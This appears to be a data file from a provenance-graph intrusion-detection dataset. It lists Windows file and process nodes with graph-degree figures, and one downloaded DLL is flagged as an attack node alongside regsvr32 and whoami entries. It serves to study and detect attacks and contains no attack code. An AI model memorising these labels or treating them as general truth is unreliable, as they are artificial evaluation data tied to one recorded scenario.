uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
b1a0ed17-9c86-41a7-b0f1-49f642d21736,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_781fb11327496ef5_1_1'},760,False,2,0,2,2,0,2
afc92ce6-4c19-4c0a-a5b9-d3b7a0aa9cd5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_39a38712b9fb879d_0_1'},761,False,2,0,2,2,0,2
8e423da5-8687-46dd-8eb9-86c15d4078de,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_39a38712b9fb879d_1_1'},762,False,2,0,2,2,0,2
ff583e10-d5dd-4f6a-9689-949ce3ac0b98,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_c313000bd77955e3_0_1'},763,False,2,0,2,2,0,2
0daaebb0-04b8-4add-830d-386dae4aca6e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_c313000bd77955e3_1_1'},764,False,2,0,2,2,0,2
8cee0e9b-917f-4355-a0de-f2d72a1fc02d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_40eb8c22f2eba043_0_1'},765,False,2,0,2,2,0,2
82fe4836-cb34-4533-8fe0-500fad70176a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_40eb8c22f2eba043_1_1'},766,False,2,0,2,2,0,2
7940a063-7bcf-48ab-b81b-17acf528da19,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_71900f6c184705dc_0_1'},767,False,2,0,2,2,0,2
a44196b5-d5bc-48b6-9d4d-b8908eeb3667,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_71900f6c184705dc_1_1'},768,False,2,0,2,2,0,2
cc2f14a8-46df-4a5f-a146-a4fc0139bfe7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\6ec67dda-f7e2-4cfe-98c4-183cd1af86e2.tmp'},770,False,1,1,2,1,1,2
d7d1a3f0-957e-4152-a1ee-647e76e37df0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\TransportSecurity~RF16d14f.TMP'},772,False,2,0,2,2,0,2
0db29ece-ab7d-4cd5-9664-5c173ca3ffc9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\5691a1fa-0f32-4047-a50e-ef4f8369c059.tmp'},774,False,1,1,2,1,1,2
48a5f495-99b2-4ac6-935d-46187151dac5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF16d825.TMP'},776,False,2,0,2,2,0,2
5c285c65-b7c5-4a81-80ba-5fc866104182,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\bd6879be-6202-4f56-a24c-6688c28b0fc9.tmp'},777,False,1,1,2,1,1,2
a41ea6a0-20a3-4f95-ab40-7f09eeed39aa,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF16d825.TMP'},779,False,2,0,2,2,0,2
b3c7aa9e-ec28-44f6-b966-f9c910940268,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Microsoft Edge.lnk'},834,False,2,0,2,2,0,2
405279a9-0023-432e-a08c-2aeb9cf743ce,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\AvailabilityDB\\LOG.old~RF16fb7b.TMP'},850,False,2,0,2,2,0,2
73725b90-0c9d-429c-bab3-05f823debe67,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\AvailabilityDB\\LOG'},851,False,1,1,2,1,1,2
165c22ef-3959-4fe0-bdc7-1618ef17dc6b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\EventDB\\LOG.old~RF16fb8b.TMP'},854,False,2,0,2,2,0,2
e4944f48-aceb-4dc2-8e33-0608fdb65b57,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\EventDB\\LOG'},855,False,1,1,2,1,1,2
e98a368a-aba4-4383-9eb4-cc023804784b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\d424dc51-adbc-4e64-9cf9-fbf404d87547.tmp'},866,False,1,1,2,1,1,2
ce25d7ac-835d-4f26-adc2-98ad395fa845,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF17030d.TMP'},867,False,2,0,2,2,0,2
a4d5a451-6895-46db-b2cb-e9c61c4bb45a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\index-dir\\temp-index'},871,False,1,1,2,1,1,2
6b48f328-3424-4d8a-a9b0-b28a70e823e0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\index-dir\\the-real-index~RF170cd1.TMP'},873,False,2,0,2,2,0,2
f4d57a1b-cb93-4eb9-9ef4-9b4a38477b3f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\index-dir\\temp-index'},876,False,1,1,2,1,1,2
c0330498-0a64-46f6-87e1-8be3f60b37fa,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\index-dir\\the-real-index~RF17127e.TMP'},878,False,2,0,2,2,0,2
bc99bec2-8042-48dc-936f-1aa9173f9bbd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\index.txt.tmp'},879,False,1,1,2,1,1,2
3784b10d-516c-4c48-aa2a-a9838a7553e7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\index.txt~RF1712ad.TMP'},881,False,2,0,2,2,0,2
2e688ca1-f014-4108-ab8d-f7edc2a01e62,{'file': 'C:\\Users\\victim\\Downloads\\a17893ed-5cd8-4018-9083-46190bf774d6.tmp'},884,False,1,1,2,1,1,2
34c42dd4-ab9c-49e1-b889-50e9dbfde99a,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\5f7b5f1e01b83767.automaticDestinations-ms'},892,False,2,0,2,2,0,2
768043f8-7808-4567-ab25-d35ae5605372,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\30eac91c-4915-4962-8c0e-a9a4d2599c50.tmp'},908,False,1,1,2,1,1,2
accaf1c2-aca8-467a-8d8a-7f3968e08378,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF171bf4.TMP'},909,False,2,0,2,2,0,2
61b130db-d669-4e1e-8be7-cf1aaaacc502,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\3b4649fa-38bf-4004-a9ae-29fc9306f13b.tmp'},911,False,1,1,2,1,1,2
42db6f0d-732a-4a58-8bad-2fc845267396,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State~RF172328.TMP'},913,False,2,0,2,2,0,2
637499a9-c1ff-4436-b763-cc0067cd9010,{'file': 'C:\\Users\\victim\\Downloads\\REASONABLE_GRASS.dll'},915,True,2,0,2,2,0,2
822fbb63-4783-4f44-a7e5-0193784a74e2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\f4a62931-8e7b-472b-b6c2-8d49a61701f6.tmp'},917,False,1,1,2,1,1,2
d07034da-6947-4b6b-8f90-04a79fec19d2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF172d3a.TMP'},918,False,2,0,2,2,0,2
d9bc8be7-487d-4eaa-a288-b4349255cf80,{'file': 'C:\\Windows\\System32\\UIAutomationCore.dll'},920,False,2,0,2,2,0,2
d55f3873-2499-4ea4-ba20-b6a2c8fd7675,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\5697c638-013d-40d3-a4eb-37d7e0e4954f.tmp'},922,False,1,1,2,1,1,2
45f8d164-99ac-429a-abc6-406a9f8843a6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF1746bd.TMP'},923,False,2,0,2,2,0,2
be76826d-4d98-4226-8ead-3050c5bfb134,{'file': 'C:\\Windows\\system32\\acppage.dll'},927,False,2,0,2,2,0,2
f3f5fc18-8d89-4063-8d82-dd4a255da0a5,{'file': 'C:\\Windows\\System32\\consent.exe'},936,False,1,0,1,2,0,2
5ff59143-6991-46f9-bbba-330a10f399ce,{'file': 'C:\\Windows\\media\\Windows User Account Control.wav'},938,False,1,0,1,2,0,2
7829d9cc-c227-41c0-b10d-3bdf8da51c32,{'file': 'Cmder.exe'},946,False,1,0,1,2,0,2
50e15a94-68b0-4b5a-b31d-4a254ae19570,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo   ""'}",991,False,0,2,2,0,2,2
f9950cd5-39eb-490a-bf51-e06c184541e2,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd"" ""'}",1047,False,0,2,2,0,2,2
3e49229e-8859-49e3-beb3-eaf8f805fc47,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps""""'}",1052,False,0,2,2,0,2,2
348d770b-8f70-4e9b-b6ec-765608eca7fb,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps""""'}",1054,False,0,2,2,0,2,2
c70d291e-6230-424e-9884-1fb300ade748,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\mingw64\\bin"" ""'}",1056,False,0,2,2,0,2,2
7f3897bf-193e-44c8-86ae-188c6d005ea4,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps""""'}",1059,False,0,2,2,0,2,2
231d5d7a-1f94-4f20-8f76-4d89ff31e859,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps""""'}",1061,False,0,2,2,0,2,2
3dd3dc64-c0ad-4224-81f2-921b1fbc80ac,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\usr\\bin"" ""'}",1063,False,0,2,2,0,2,2
a280ebce-9223-45f6-a5ba-118016b50d53,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1065,False,0,2,2,0,2,2
99c8f056-406c-45af-b883-b602de08f0b6,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1067,False,0,2,2,0,2,2
d0b9c9dc-fa6a-43f9-b5a5-3039a75a7b4b,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\bin"" ""'}",1080,False,0,2,2,0,2,2
ad9b3963-b205-4c67-952a-363f9b396a31,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1082,False,0,2,2,0,2,2
4c530f35-0ffe-4dbc-b3d5-7a99684874c0,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1084,False,0,2,2,0,2,2
723d8e1f-bab8-4a22-91ad-59a808a1cff6,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder\\bin""  2>NUL""'}",1086,False,0,2,2,0,2,2
7023d27a-9504-46e6-b7ae-ea64f4f47eb3,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" dir ""C:\\Users\\victim\\Desktop\\cmder"" ""'}",1088,False,0,2,2,0,2,2
895c807c-244e-4f6e-bb6b-bd21a1b071b0,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1090,False,0,2,2,0,2,2
e33d9209-5aa6-40fb-82ba-66ef3f98abd1,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" echo ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\cmd;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5;C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\chocolatey\\bin;C:\\Users\\victim\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\victim\\De'}",1092,False,0,2,2,0,2,2
73d8d082-a166-4f3f-ab88-e918444567af,{'subject': 'C:\\Windows\\system32\\cmd.exe /c dir /b *.bat *.cmd 2>nul'},1094,False,0,2,2,0,2,2
a2d93da7-9e53-4ff3-b590-35e3fcaf9e16,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c ""VER""'}",1108,False,0,2,2,0,2,2
ea61732b-8836-4ff4-804a-bd5b264975f4,{'file': 'C:\\Users\\Public\\Desktop\\Microsoft Edge.lnk'},1146,False,2,0,2,2,0,2
d0224df5-548d-4dc8-a867-d8bdd16bb436,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\0c274b59-3375-4909-97d5-de3e1748b7d9.tmp'},1286,False,1,1,2,1,1,2
14819279-caa9-40b4-b848-2d956a131846,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF17687e.TMP'},1288,False,2,0,2,2,0,2
3ef80046-39cc-4da5-b53e-bb9ce6c4a798,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\b75419e0-dcaa-4a6a-8534-8a4c9b1cefa7.tmp'},1686,False,1,1,2,1,1,2
92e1e8c6-af47-4644-a250-bbf2a96388ed,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF177445.TMP'},1687,False,2,0,2,2,0,2
edb3c915-26bf-4b4b-a68c-8847fa162414,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\Caches\\{3DA71D5A-20CC-432F-A115-DFE92379E91F}.3.ver0x0000000000000014.db'},1713,False,1,0,1,2,0,2
d49621b1-0de0-4f3e-a43b-1e81b305ae81,{'file': 'C:\\Windows\\system32\\regsvr32.exe'},1776,False,2,0,2,2,0,2
8221a047-6b06-4327-97e1-40ce8f94f168,{'file': 'C:\\Windows\\System32\\regsvr32.exe'},1779,False,2,0,2,2,0,2
71a7fec3-d768-4498-af92-cd2bce53be4e,{'file': 'C:\\Windows\\system32\\whoami.exe'},1782,False,2,0,2,2,0,2
9488880a-04c7-4565-ad9b-e4fbcad31563,{'file': 'whoami.exe'},1784,False,2,0,2,2,0,2
aefbd212-3e5c-4d6a-a522-b868013b32e8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\16e5c9fe-aad9-4d55-b4d1-5d7ba8708385.tmp'},1795,False,1,1,2,1,1,2
9cd3b3aa-a2b6-4fc2-8de7-3addfa69d00d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF180d49.TMP'},1796,False,2,0,2,2,0,2
b5b308fd-e0b6-44e1-be9f-ad3d34ba444c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\5fe4c778-3323-4461-98e8-092437483df9.tmp'},1797,False,1,1,2,1,1,2
5a9f2fb8-8a74-4a82-a4bc-af17f8a1383b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State~RF18502e.TMP'},1798,False,2,0,2,2,0,2
0fc8dd37-670e-41e6-af8f-55735cf89165,{'file': 'C:\\Users\\victim\\Downloads\\13cc0aaa-4b65-42bd-90f7-0c0858f52462.tmp'},2349,False,1,1,2,1,1,2
96cb0946-55e8-4118-b6c0-093820d85a28,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\bed63da0-941c-45dd-bf5f-655fbf7ed5ee.tmp'},2696,False,1,1,2,1,1,2
b59551df-c860-40be-94f8-80b46f82a930,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF19c375.TMP'},2698,False,2,0,2,2,0,2
651b90c9-8c78-4379-9517-b8172abbbcc1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\971d25e3-5e7c-4eef-a6fc-ac8308c0698b.tmp'},2700,False,1,1,2,1,1,2
514c9b2d-5cb8-4c0e-ae8d-05e506d74656,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State~RF19ce43.TMP'},2701,False,2,0,2,2,0,2
0967b257-93e5-4ba2-a896-2b6ef46b3322,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\77e58d5c-1d10-437f-a3eb-aa37e545d03d.tmp'},2702,False,1,1,2,1,1,2
d651ad41-a648-466c-8d8a-a71070018e07,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF19d509.TMP'},2703,False,2,0,2,2,0,2
dc2ce64f-3ae7-4b87-9723-d8f8518eaea8,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},2721,False,0,1,1,0,2,2
495eb045-5d06-4c2a-a11e-2a93181fa6e6,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},2729,False,0,1,1,0,2,2
6ea59f49-9f18-4070-9f87-15406ea35498,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\fe8bbea6-9018-46ce-b499-7b024b6113a5.tmp'},5472,False,1,1,2,1,1,2
ed214224-9d3b-43a0-bfc7-7ba2945e2285,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF1acc1b.TMP'},5474,False,2,0,2,2,0,2
126ab297-4569-49b3-bf3a-a2ec1177ceef,{'file': 'C:\\Users\\victim\\Desktop\\x64\\powershelloutput\\20260306\\PowerShell_transcript.WIN10-BASIC-TAR.yEDuFSSZ.20260306203019.txt'},7129,False,2,0,2,2,0,2
7569a665-a3ff-4143-8fd2-18efeaa5a442,{'file': 'C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Management\\v4.0_3.0.0.0__31bf3856ad364e35\\Microsoft.PowerShell.Commands.Management.dll'},7177,False,2,0,2,2,0,2
f2351948-080d-422f-b2b9-dfc9d0440001,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\a5071d8b-110e-4457-b915-e0d2aaf8e6cc.tmp'},7215,False,1,1,2,1,1,2
d402adfa-b7ec-4b74-bbce-ce711a83f09c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State~RF1b0d89.TMP'},7217,False,2,0,2,2,0,2
